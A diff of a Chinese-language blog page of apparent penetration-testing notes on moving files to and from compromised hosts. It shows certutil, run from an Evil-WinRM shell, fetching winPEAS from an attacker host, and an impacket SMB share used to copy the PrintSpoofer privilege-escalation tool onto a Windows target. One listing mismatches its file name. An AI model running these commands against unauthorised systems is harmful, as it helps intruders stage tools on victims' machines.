@@ -7,7 +7,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
 <meta name="description" content="Linux 以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader . Windows 传入文件 *Evil-WinRM* PS C:\programdata\apps&gt; certutil.exe -urlcache -split -f &#34;http://10.10.16.155:8000/winPEASx64.exe&#34; . **** Online **** 000000 ... 9b3200 CertUtil: -URLCache command completed successfully. 传出文件 download " />
+┌──(kali㉿kali)-[~/Work/Kali] └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader . Windows 传入文件 Certutil *Evil-WinRM* PS C:\programdata\apps&gt; certutil.exe -urlcache -split -f &#34;http://10.10.16.155:8000/winPEASx64.exe&#34; . **** Online **** 000000 ... 9b3200 CertUtil: -URLCache command completed successfully. Impacket-smbserver 在要共享的文件夹下创建共享目录。
+┌──(kali㉿kali)-[~/Work] └─$ ls -liah PrintSpoofer64.exe 2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe ┌──(kali㉿kali)-[~/Work] └─$ sudo impacket-smbserver Enil . -smb2support [sudo] password for kali: Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed impacket-smbserver 必须添加参数 -smb2support 参数，即启用 SMB2 协议支持。
+" />
 <meta name="keywords" content=", Hack" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -42,16 +44,18 @@
 
   <meta itemprop="name" content="传输文件">
   <meta itemprop="description" content="Linux 以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader . Windows 传入文件 *Evil-WinRM* PS C:\programdata\apps&gt; certutil.exe -urlcache -split -f &#34;http://10.10.16.155:8000/winPEASx64.exe&#34; . **** Online **** 000000 ... 9b3200 CertUtil: -URLCache command completed successfully. 传出文件 download">
+┌──(kali㉿kali)-[~/Work/Kali] └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader . Windows 传入文件 Certutil *Evil-WinRM* PS C:\programdata\apps&gt; certutil.exe -urlcache -split -f &#34;http://10.10.16.155:8000/winPEASx64.exe&#34; . **** Online **** 000000 ... 9b3200 CertUtil: -URLCache command completed successfully. Impacket-smbserver 在要共享的文件夹下创建共享目录。
+┌──(kali㉿kali)-[~/Work] └─$ ls -liah PrintSpoofer64.exe 2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe ┌──(kali㉿kali)-[~/Work] └─$ sudo impacket-smbserver Enil . -smb2support [sudo] password for kali: Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed impacket-smbserver 必须添加参数 -smb2support 参数，即启用 SMB2 协议支持。">
   <meta itemprop="datePublished" content="2026-02-27T17:00:00+08:00">
   <meta itemprop="dateModified" content="2026-02-27T17:00:00+08:00">
-  <meta itemprop="wordCount" content="43">
+  <meta itemprop="wordCount" content="165">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="传输文件">
   <meta name="twitter:description" content="Linux 以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。
-┌──(kali㉿kali)-[~/Work/Kali] └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader . Windows 传入文件 *Evil-WinRM* PS C:\programdata\apps&gt; certutil.exe -urlcache -split -f &#34;http://10.10.16.155:8000/winPEASx64.exe&#34; . **** Online **** 000000 ... 9b3200 CertUtil: -URLCache command completed successfully. 传出文件 download">
+┌──(kali㉿kali)-[~/Work/Kali] └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader . Windows 传入文件 Certutil *Evil-WinRM* PS C:\programdata\apps&gt; certutil.exe -urlcache -split -f &#34;http://10.10.16.155:8000/winPEASx64.exe&#34; . **** Online **** 000000 ... 9b3200 CertUtil: -URLCache command completed successfully. Impacket-smbserver 在要共享的文件夹下创建共享目录。
+┌──(kali㉿kali)-[~/Work] └─$ ls -liah PrintSpoofer64.exe 2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe ┌──(kali㉿kali)-[~/Work] └─$ sudo impacket-smbserver Enil . -smb2support [sudo] password for kali: Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed impacket-smbserver 必须添加参数 -smb2support 参数，即启用 SMB2 协议支持。">
 
 
 
@@ -138,6 +142,8 @@
     <li><a href="#windows">Windows</a>
       <ul>
         <li><a href="#传入文件">传入文件</a></li>
+        <li><a href="#certutil">Certutil</a></li>
+        <li><a href="#impacket-smbserver">Impacket-smbserver</a></li>
         <li><a href="#传出文件">传出文件</a></li>
       </ul>
     </li>
@@ -154,6 +160,7 @@
 </span></span><span style="display:flex;"><span>└─$ scp -P <span style="color:#ae81ff">10110</span> -q erso@10.110.10.45:/bin/dartVader .
 </span></span></code></pre></div><h2 id="windows">Windows</h2>
 <h3 id="传入文件">传入文件</h3>
+<h3 id="certutil">Certutil</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; certutil.exe -urlcache -split -f <span style="color:#e6db74">&#34;http://10.10.16.155:8000/winPEASx64.exe&#34;</span> .
 </span></span><span style="display:flex;"><span>****  Online  ****
 </span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">000000</span>  ...
@@ -161,6 +168,40 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span></code></pre></div><h3 id="impacket-smbserver">Impacket-smbserver</h3>
+<p>在要共享的文件夹下创建共享目录。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah PrintSpoofer64.exe 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2551692</span> -rwxrwxrwx <span style="color:#ae81ff">1</span> kali kali 54K Dec <span style="color:#ae81ff">15</span> 00:40 nc64.exe
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo impacket-smbserver Enil . -smb2support
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><p>impacket-smbserver 必须添加参数 <code>-smb2support</code> 参数，即启用 SMB2 协议支持。</p>
+<p>copy。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\P</span>rintSpoofer64.exe .<span style="color:#ae81ff">\P</span>rintSpoofer64.exe
+</span></span><span style="display:flex;"><span>copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\P</span>rintSpoofer64.exe .<span style="color:#ae81ff">\P</span>rintSpoofer64.exe
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is AEF2-0DF2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/02/2026  03:00 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>03/02/2026  03:00 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>         27,136 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4,617,351,168 bytes free
 </span></span></code></pre></div><h3 id="传出文件">传出文件</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>download
 </span></span></code></pre></div>
